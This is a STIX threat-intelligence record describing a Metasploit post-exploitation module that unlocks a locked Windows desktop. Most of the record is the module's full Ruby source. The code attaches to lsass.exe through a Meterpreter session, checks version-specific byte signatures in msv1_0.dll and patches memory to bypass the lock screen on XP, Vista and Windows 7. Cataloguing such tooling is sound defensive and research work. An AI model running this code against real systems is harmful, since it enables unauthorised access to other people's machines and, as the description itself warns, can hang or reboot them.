{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--25bc3410-0c07-4d3f-9537-6dda1af38233",
    "created": "2024-08-14T16:33:04.966603Z",
    "modified": "2024-08-14T16:33:04.966607Z",
    "name": "Windows Escalate Locked Desktop Unlocker",
    "description": " This module unlocks a locked Windows desktop by patching the respective code inside the LSASS.exe process. This patching process can result in the target system hanging or even rebooting, so be careful when using this module on production systems.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/escalate/screen_unlock.rb",
            "external_id": "screen_unlock.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Version\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate Locked Desktop Unlocker',\n        'Description' => %q{\n          This module unlocks a locked Windows desktop by patching\n          the respective code inside the LSASS.exe process. This\n          patching process can result in the target system hanging or\n          even rebooting, so be careful when using this module on\n          production systems.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'L4teral <l4teral[4t]gmail com>', # Meterpreter script\n          'Metlstorm' # Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_attach\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('REVERT', [false, 'Enable this option to revert the in-memory patch and enable locking again', false])\n    ])\n  end\n\n  def unsupported\n    print_error('This platform is not supported with this Script!')\n    raise Rex::Script::Completed\n  end\n\n  def run\n    revert = datastore['REVERT']\n\n    targets = [\n      { sig: '8bff558bec83ec50a1', sigoffset: 0x9927, orig_code: '32c0', patch: 'b001', patchoffset: 0x99cc, os_start: Msf::WindowsVersion::XP_SP2, os_end: Msf::WindowsVersion::XP_SP2 },\n      { sig: '8bff558bec83ec50a1', sigoffset: 0x981b, orig_code: '32c0', patch: 'b001', patchoffset: 0x98c0, os_start: Msf::WindowsVersion::XP_SP3, os_end: Msf::WindowsVersion::XP_SP3 },\n      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xb76a, orig_code: '32c0', patch: 'b001', patchoffset: 0xb827, os_start: Msf::WindowsVersion::Vista_SP0, os_end: Msf::WindowsVersion::Vista_SP2 },\n      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xb391, orig_code: '32c0', patch: 'b001', patchoffset: 0xb44e, os_start: Msf::WindowsVersion::Vista_SP0, os_end: Msf::WindowsVersion::Vista_SP2 },\n      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xacf6, orig_code: '32c0', patch: 'b001', patchoffset: 0xadb3, os_start: Msf::WindowsVersion::Vista_SP0, os_end: Msf::WindowsVersion::Vista_SP2 },\n      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xe881, orig_code: '32c0', patch: 'b001', patchoffset: 0xe93e, os_start: Msf::WindowsVersion::Win7_SP0, os_end: Msf::WindowsVersion::Win7_SP1 },\n      { sig: '8bff558bec83ec50a1', sigoffset: 0x97d3, orig_code: '32c0', patch: 'b001', patchoffset: 0x9878, os_start: Msf::WindowsVersion::XP_SP3, os_end: Msf::WindowsVersion::XP_SP3 } # Spanish\n    ]\n\n    unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)\n    version = get_version_info\n\n    targets.each do |t|\n      next unless version.build_number.between?(t[:os_start], t[:os_end]) && !version.windows_server?\n\n      target = t\n      print_status(\"OS '#{version.product_name}' found in known targets\")\n      pid = client.sys.process['lsass.exe']\n      p = client.sys.process.open(pid, PROCESS_ALL_ACCESS)\n      dllbase = p.image['msv1_0.dll']\n\n      sig = p.memory.read(dllbase + target[:sigoffset], target[:sig].length / 2).unpack('H*')[0]\n      if sig != target[:sig]\n        print_error('Found signature does not match')\n        next\n      end\n      old_code = p.memory.read(dllbase + target[:patchoffset], target[:orig_code].length / 2).unpack('H*')[0]\n      if !((old_code == target[:orig_code] && !revert) || (old_code == target[:patch] && revert))\n        print_error('Found code does not match')\n        next\n      end\n\n      print_status('Patching...')\n      new_code = revert ? target[:orig_code] : target[:patch]\n      p.memory.write(dllbase + target[:patchoffset], [new_code].pack('H*'))\n\n      written_code = p.memory.read(dllbase + target[:patchoffset], target[:patch].length / 2).unpack('H*')[0]\n      if ((written_code == target[:patch] && !revert) || (written_code == target[:orig_code] && revert))\n        print_status('Done!')\n        raise Rex::Script::Completed\n      else\n        print_error('Failed!')\n        next\n      end\n    end\n\n    print_error('No working target found')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}